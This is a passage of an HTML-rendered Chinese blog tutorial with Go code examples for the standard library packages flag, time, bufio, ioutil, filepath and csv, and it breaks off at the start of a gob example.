class="line"></span><br><span class="line"></span><br><span class="line">   fmt.Println()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">"errors"</span></span><br><span class="line">   <span class="string">"flag"</span></span><br><span class="line">   <span class="string">"fmt"</span></span><br><span class="line">   <span class="string">"strings"</span></span><br><span class="line">   <span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// 自定义类型，需要实现两个接口</span></span><br><span class="line"><span class="comment">//type Value interface &#123;</span></span><br><span class="line"><span class="comment">// String() string</span></span><br><span class="line"><span class="comment">// Set() error</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> interval []time.Duration</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i *interval)</span><span class="title">String</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">   <span class="keyword">return</span> fmt.Sprint(*i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(i *interval)</span><span class="title">Set</span><span class="params">(value <span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(*i)&gt;<span class="number">0</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> errors.New(<span class="string">"interval flag already set"</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> _,dt := <span class="keyword">range</span> strings.Split(value,<span class="string">","</span>)&#123;</span><br><span class="line">      duration,err := time.ParseDuration(dt)</span><br><span class="line">      <span class="keyword">if</span> err !=<span class="literal">nil</span>&#123;</span><br><span class="line">         <span class="keyword">return</span> err</span><br><span class="line">      &#125;</span><br><span class="line">      *i = <span class="built_in">append</span>(*i,duration)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">   intervalFlag interval</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="comment">// 自定义类型使用Var方法</span></span><br><span class="line">   flag.Var(&amp;intervalFlag,<span class="string">"defalut"</span>,<span class="string">"comma-seperate"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   flag.Parse()</span><br><span class="line"></span><br><span class="line">   fmt.Println(intervalFlag)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="time"><a href="#time" class="headerlink" title="time"></a>time</h3><p>时间相关</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myTime</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> formatTime = <span class="string">"2006-01-02 15:04:05"</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 当前时间（返回time类型）</span></span><br><span class="line">nowTime := time.Now()</span><br><span class="line">fmt.Println(nowTime)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 时间转换</span></span><br><span class="line"><span class="comment">// time-&gt;时间戳</span></span><br><span class="line">fmt.Println(<span class="string">"time-&gt;时间戳: "</span>,nowTime.Unix())</span><br><span class="line"><span class="comment">// 时间戳-&gt;time</span></span><br><span class="line">fmt.Println(<span class="string">"时间戳-&gt;time: "</span>,time.Unix(nowTime.Unix(),<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 时间操作</span></span><br><span class="line"><span class="comment">// Add</span></span><br><span class="line">fmt.Println(<span class="string">"当前时间+1H"</span>,nowTime.Add(time.Hour))</span><br><span class="line"><span class="comment">// Sub</span></span><br><span class="line">fmt.Println(<span class="string">"两时间之差"</span>,nowTime.Sub(nowTime.Add(-time.Hour)))</span><br><span class="line"><span class="comment">// Equal</span></span><br><span class="line">fmt.Println(<span class="string">"判断时间是否相等"</span>,nowTime.Equal(nowTime.Add(time.Hour)))</span><br><span class="line"><span class="comment">// Before</span></span><br><span class="line"><span class="comment">// After</span></span><br><span class="line">fmt.Println(<span class="string">"判断时间点前后(Before)"</span>,nowTime.After(nowTime))</span><br><span class="line">fmt.Println(<span class="string">"判断时间点前后(After)"</span>,nowTime.Before(nowTime))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 时间格式化 format</span></span><br><span class="line">fmt.Println(<span class="string">"2006-01-02 15:04:05 格式化"</span>,nowTime.Format(formatTime))</span><br><span class="line"><span class="comment">// 解析字符串时间 parse</span></span><br><span class="line"><span class="keyword">var</span> timStr = <span class="string">"2019-12-12 15:22:12"</span></span><br><span class="line">timeObj1, _ := time.Parse(formatTime, timStr)</span><br><span class="line">timeObj2,_ := time.ParseInLocation(formatTime,timStr,time.Local)</span><br><span class="line">fmt.Println(<span class="string">"parse解析字符串时间"</span>,timeObj1)</span><br><span class="line">fmt.Println(<span class="string">"parse解析字符串时间"</span>,timeObj2)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当天0点时间戳</span></span><br><span class="line"><span class="comment">// 获取前一天0点时间戳</span></span><br><span class="line">todayTime := time.Date(time.Now().Year(),time.Now().Month(),time.Now().Day(),<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,time.Local)</span><br><span class="line">fmt.Println(<span class="string">"今天0点时间戳："</span>,todayTime.Unix())</span><br><span class="line">yestaday := todayTime.AddDate(<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>)</span><br><span class="line">fmt.Println(<span class="string">"昨天0点时间戳: "</span>,yestaday.Unix())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">myTime()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="bufio"><a href="#bufio" class="headerlink" title="bufio"></a>bufio</h3><p>带缓冲的读写。包括：reader | writer | scanner | ioutil</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"bufio"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line"><span class="string">"strconv"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myScannerInt</span><span class="params">()</span> <span class="params">(<span class="keyword">int</span>, error)</span></span> &#123;</span><br><span class="line">scanner := bufio.NewScanner(os.Stdin)</span><br><span class="line"><span class="keyword">if</span> scanner.Scan() &#123;</span><br><span class="line"><span class="keyword">return</span> strconv.Atoi(scanner.Text())</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>, scanner.Err()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 感觉比reader方便</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">scanerv1</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 新建Scanner，参数理解为文件指针</span></span><br><span class="line">scanner := bufio.NewScanner(os.Stdin)</span><br><span class="line"><span class="comment">// 判断是否读取结束，每次读取一行，结束为false</span></span><br><span class="line"><span class="comment">//scanner.Scan()</span></span><br><span class="line"><span class="comment">// 转化为字符串</span></span><br><span class="line"><span class="comment">//fmt.Println(scanner.Text())</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 手动指定scanner缓冲区大小</span></span><br><span class="line"><span class="comment">// 初始为2，其会自动扩拓展</span></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>,<span class="number">2</span>)</span><br><span class="line">scanner.Buffer(buf,bufio.MaxScanTokenSize)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以指定函数来将输入拆分为多个token，其中bufio自带四个func</span></span><br><span class="line"><span class="comment">// ScanBytes，按照byte进行拆分</span></span><br><span class="line"><span class="comment">// ScanLines，按照行(“\n”)进行拆分</span></span><br><span class="line"><span class="comment">// ScanRunes，按照utf-8字符进行拆分</span></span><br><span class="line"><span class="comment">// ScanWords，按照单词(” “)进行拆分</span></span><br><span class="line"><span class="comment">// 也可以自己指定func</span></span><br><span class="line">scanner.Split(bufio.ScanWords)</span><br><span class="line"><span class="keyword">for</span> scanner.Scan() &#123;</span><br><span class="line">fmt.Println(scanner.Text())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myReader</span><span class="params">()</span></span> &#123;</span><br><span class="line">file, err := os.Open(<span class="string">"bufio"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新建读io(带buffer)</span></span><br><span class="line">reader := bufio.NewReader(file)</span><br><span class="line">content := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">3</span>)</span><br><span class="line">n, err := reader.Read(content)</span><br><span class="line">fmt.Println(n, err, <span class="keyword">string</span>(content[:n]))</span><br><span class="line">fmt.Println(reader.ReadByte())</span><br><span class="line"><span class="comment">// 参数指定分隔符</span></span><br><span class="line">fmt.Println(reader.ReadBytes(<span class="string">'\n'</span>))</span><br><span class="line">fmt.Println(reader.ReadString(<span class="string">'\n'</span>))</span><br><span class="line">fmt.Println(reader.ReadString(<span class="string">'\n'</span>))</span><br><span class="line">fmt.Println(reader.ReadString(<span class="string">'\n'</span>))</span><br><span class="line"><span class="comment">// 读取一行</span></span><br><span class="line">fmt.Println(reader.ReadLine())</span><br><span class="line">fmt.Println(reader.ReadLine())</span><br><span class="line">fmt.Println(reader.ReadLine())</span><br><span class="line"><span class="comment">// 流重定向</span></span><br><span class="line">fmt.Println(reader.WriteTo(os.Stdout))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myWriter</span><span class="params">()</span></span> &#123;</span><br><span class="line">file, err := os.OpenFile(<span class="string">"bufio"</span>, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带缓冲的写，会写到缓冲区，而不是直接写入文件，可以使用flush将缓冲区的内容写入文件</span></span><br><span class="line">writer := bufio.NewWriter(file)</span><br><span class="line">fmt.Println(writer.WriteString(<span class="string">"123456"</span>))</span><br><span class="line">writer.Flush()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ioutil</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ioUtilev1</span><span class="params">()</span></span> &#123;</span><br><span class="line">file,err := os.Open(<span class="string">"bufio"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件中所有内容</span></span><br><span class="line">fmt.Println(ioutil.ReadAll(file))</span><br><span class="line">fmt.Println()</span><br><span class="line"><span class="comment">// 获取当前目录的所有文件指针，通过遍历访问</span></span><br><span class="line">fileinfos,err := ioutil.ReadDir(<span class="string">"c:\\"</span>)</span><br><span class="line"><span class="keyword">for</span> _,fileinfo := <span class="keyword">range</span> fileinfos&#123;</span><br><span class="line">fmt.Println(fileinfo.Name())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 截断文件并写入</span></span><br><span class="line">ioutil.WriteFile(<span class="string">"fmt"</span>,[]<span class="keyword">byte</span>(<span class="string">"123456"</span>),os.ModePerm)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">scanerv1()</span><br><span class="line"><span class="comment">/*num,err:=myScannerInt()</span></span><br><span class="line"><span class="comment">fmt.Println(num,err)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">num,err=myScannerInt()</span></span><br><span class="line"><span class="comment">fmt.Println(num,err)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">num,err=myScannerInt()</span></span><br><span class="line"><span class="comment">fmt.Println(num,err)*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//myReader()</span></span><br><span class="line"><span class="comment">//myWriter()</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="filepath"><a href="#filepath" class="headerlink" title="filepath"></a>filepath</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io/ioutil"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line"><span class="string">"path/filepath"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">dirv1</span><span class="params">()</span></span> &#123;</span><br><span class="line">file, err := os.Open(<span class="string">"bufio"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看文件（文件+目录）状态</span></span><br><span class="line">fileInfo, err := file.Stat()</span><br><span class="line">fmt.Println(fileInfo.IsDir())</span><br><span class="line">fmt.Println(fileInfo.Mode())</span><br><span class="line">fmt.Println(fileInfo.Name())</span><br><span class="line">fmt.Println(fileInfo.Size())</span><br><span class="line">fmt.Println(fileInfo.Sys())</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// filepath处理文件和目录</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">path</span><span class="params">()</span></span> &#123;</span><br><span class="line">path,_ := filepath.Abs(<span class="string">"fmt"</span>)</span><br><span class="line">fmt.Println(path)</span><br><span class="line">fmt.Println(filepath.Base(path))</span><br><span class="line">    fmt.Println(filepath.Dir(path))</span><br><span class="line">    <span class="comment">// 判断后缀</span></span><br><span class="line">fmt.Println(filepath.Ext(path))</span><br><span class="line">fmt.Println(filepath.IsAbs(path))</span><br><span class="line"><span class="comment">// 将文件和其目录分开，存入slice</span></span><br><span class="line">fmt.Println(filepath.Split(path))</span><br><span class="line"><span class="comment">// 默认以":"分割，存入slice</span></span><br><span class="line">fmt.Println(filepath.SplitList(path))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 支持简单通配</span></span><br><span class="line">fmt.Println(filepath.Glob(<span class="string">"./*.go"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将path根据前者进行路径匹配，path在前者匹配下则为true（注意只能在当前目录）</span></span><br><span class="line">    <span class="comment">// 即第一个参数必须是第二个参数的父目录</span></span><br><span class="line">fmt.Println(filepath.Match(<span class="string">"G:\\Go\\go_work\\src\\study\\*"</span>,path))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定目录进行递归调用</span></span><br><span class="line">filepath.Walk(<span class="string">"."</span>, <span class="function"><span class="keyword">func</span><span class="params">(path <span class="keyword">string</span>, info os.FileInfo, err error)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">fmt.Println(path,info.Name())</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//dirv1()</span></span><br><span class="line">path()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="csv"><a href="#csv" class="headerlink" title="csv"></a>csv</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"encoding/csv"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line"><span class="string">"strconv"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Userscsv <span class="keyword">struct</span> &#123;</span><br><span class="line">id   <span class="keyword">int</span></span><br><span class="line">name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">csvwrite</span><span class="params">()</span></span>  &#123;</span><br><span class="line">file,err:= os.Create(<span class="string">"csv.csv"</span>)</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line">users := []Userscsv&#123;</span><br><span class="line">&#123;<span class="number">1</span>,<span class="string">"kk"</span>&#125;,</span><br><span class="line">&#123;<span class="number">2</span>,<span class="string">"qingyang"</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建csv writer</span></span><br><span class="line">writer := csv.NewWriter(file)</span><br><span class="line"><span class="keyword">for</span> _,user:= <span class="keyword">range</span> users &#123;</span><br><span class="line"><span class="comment">// 写入，参数传递字符串切片</span></span><br><span class="line">writer.Write([]<span class="keyword">string</span>&#123;strconv.Itoa(user.id), user.name&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 缓冲区写入</span></span><br><span class="line">writer.Flush()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">csvreader</span><span class="params">()</span></span> &#123;</span><br><span class="line">file,err := os.Open(<span class="string">"csv.csv"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请对应结构体变量用于读取csv文件</span></span><br><span class="line"><span class="keyword">var</span> users = []Userscsv&#123;&#125;</span><br><span class="line"><span class="comment">// 创建csv reader</span></span><br><span class="line">reader := csv.NewReader(file)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="comment">// 返回一个[]string，index为csv一行的内容</span></span><br><span class="line">line,err := reader.Read()</span><br><span class="line"><span class="comment">// 为EOF停止读取</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">if</span> err != io.EOF &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">id,_:= strconv.Atoi(line[<span class="number">0</span>])</span><br><span class="line">users = <span class="built_in">append</span>(users,Userscsv&#123;</span><br><span class="line">id: id  ,</span><br><span class="line">name: line[<span class="number">1</span>],</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(users)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">csvwrite()</span><br><span class="line">csvreader()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 